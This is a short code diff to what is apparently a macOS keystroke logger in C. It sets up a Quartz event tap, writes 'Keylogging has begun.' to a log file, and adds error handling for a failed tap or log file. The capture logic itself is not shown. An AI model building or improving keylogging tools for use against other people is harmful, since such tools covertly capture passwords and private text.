@@ -10,7 +10,7 @@ int main(int argc, const char *argv[]) {
 
     // Exit the program if unable to create the event tap.
     if(!eventTap) {
-        printf("Unable to create event tap.\n");
+        fprintf(stderr, "ERROR: Unable to create event tap.\n");
         exit(1);
     }
 
@@ -18,6 +18,7 @@ int main(int argc, const char *argv[]) {
     CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
+
 
     // Clear the logfile if clear argument used or log to specific file if given.
     if(argc == 2) {
@@ -35,6 +36,11 @@ int main(int argc, const char *argv[]) {
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
     
+    if (!logfile) {
+        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
+        exit(1);
+    }
+
     // Output to logfile.
     fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
